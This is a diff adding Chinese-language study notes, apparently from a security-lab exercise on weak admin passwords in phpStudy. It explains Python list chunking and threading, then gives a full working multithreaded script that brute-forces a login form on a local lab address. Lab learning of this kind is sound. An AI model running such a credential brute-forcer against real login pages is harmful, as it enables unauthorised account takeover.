@@ -3035,13 +3035,136 @@ if __name__ == '__main__':
 ----------------------------------------------------------------------------
 ```
 
+
 </details>
 
 <details>
 <summary>后台弱口令_phpStudy</summary>
 
 ```
+----------------------------------------------------------------------------
+难点
+def partition(ls, size):
+    return [ls[i:i+size] for i in range(0, len(ls),size)]
+#这个函数是 把一个列表按照指定大小分成若干小列表
+a = [1,2,3,4,5,6,7,8] print(partition(a,3)
+输出[[1,2,3],[4,5,6],[7,8]]
 
+例如
+ls = [1, 2, 3, 4, 5, 6, 7, 8]
+size = 3
+
+1.range(0, len(ls), size)
+range(0,8,3) 从0开始，每次加3，直到小于8 ，得到 0，3，6
+
+2.ls[i:i+size]
+i = 0    ls[0:3]   得到[1,2,3]
+i = 3    ls[3,6]   得到[4,5,6]
+i = 6    ls[6,9]   得到[7,8] 虽然9超过长度，但python不会报错，只取到最后
+
+列表推导式
+[ls[i:size] for i in range(0, len(ls),size)]
+等价于
+rusult = []
+
+for i in range(0, len(ls),size):
+    result.append(ls[i:i+size])
+
+return result
+----------------------------------------------------------------------------
+#创建线程 workThread = threading.Thread(target=work.start)
+
+work.start() ---现在就执行
+target=work.start  ---告诉线程以后执行
+t.start()   ---  真正启动线程，让线程开始执行work.start
+join()   ---主程序等待这个线程结束
+----------------------------------------------------------------------------
+response = requests.post()
+向指定网址发送一个HTTP POST请求，并把用户名和密码作为数据提交
+----------------------------------------------------------------------------
+把线程要执行的任务封装到一个类(ThreadWork）里面，所有才有__init__()类的构造函数
+即work = ThreadWord(sonUserBlock,sonPwdBlock)      # work 是对象，Object,实例
+  workThread = threading.Thread(target=work.start) #ThreadWork 类，Class
+
+class ThreadWork:
+  def __init__(self,username,password) # self = work, 类ThreadWork只是模版
+----------------------------------------------------------------------------
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+
+import os
+import threading
+import requests
+
+BLOCK_SIZE = 1000 #分块大小
+
+#列表分块函数
+def partition(ls, size):
+    return [ls[i:i+size] for i in range(0, len(ls),size)]
+
+#编写破解函数，该函数主要负责对数据进行分割、创建子线程并分配任务等前期工作
+def BruteForceHttp():
+    listUsername = [line.strip() for line in open("username")]
+    listPassword = [line.strip() for line in open("passwords")]
+
+    blockUsername = partition(listUsername, BLOCK_SIZE)
+    blockPassword = partition(listPassword, BLOCK_SIZE)
+    threads = []
+
+    for sonUserBlock in blockUsername:
+        for sonPwdBlock in blockPassword:
+            work = ThreadWork(sonUserBlock,sonPwdBlock)
+            workThread = threading.Thread(target=work.start)
+            threads.append(workThread)
+    for t in threads:
+        t.start()
+    for t in threads:
+        t.join()
+
+#创建子线程任务类，在其中具体定义子线程应该如何进行破解工作
+class ThreadWork:
+    url = "http://192.168.123.124/WeakPassword/login.php"
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 '
+        '(KHTML, like Gecho) '
+        'Chrome/19.0.1036.7 Safari/535.20'
+    }
+    # 类的构造函数
+    def __init__(self,username,password):
+        self.username = username
+        self.password = password
+    # 根据传入的账户密码进行破解
+    def run(self,username,password):
+        data = {
+            'username': username,
+            'password': password,
+            'submit': '%E7%99%BB%E5%BD%95' #HTTP表单提交的一个字段submit按钮，先UTF-8,再URL ‘登录‘表示'%E7%99%BB%E5%BD%95'
+        }
+        #显示正在尝试的数据
+        print("username:{},password:{}".format(username,password))
+        #发送post请求
+        response = requests.post(self.url, data=data, headers=self.headers)
+
+        #根据返回的内容中是否包含登录失败的提示来判断是否登录成功
+        if 'Login failed!' in response.text:
+            pass
+        else:
+            print("success!! username: {}, password: {}".format(username, password))
+            resultFile = open('result', 'w')
+            resultFile.write("success!!! username: {}, password: {}".format(username, password))
+            resultFile.close()
+            os._exit(0)
+
+    # start()里面的双重for才是真正生成用户名和密码的两两组合，上面的partition()在切块_块块组合，这里是在个个组合
+    def start(self):
+        for userItem in self.username:
+            for pwdItem in self.password:
+                self.run(userItem, pwdItem)
+
+if __name__ == '__main__':
+    
+    BruteForceHttp()
+----------------------------------------------------------------------------
 ```
 
 </details>
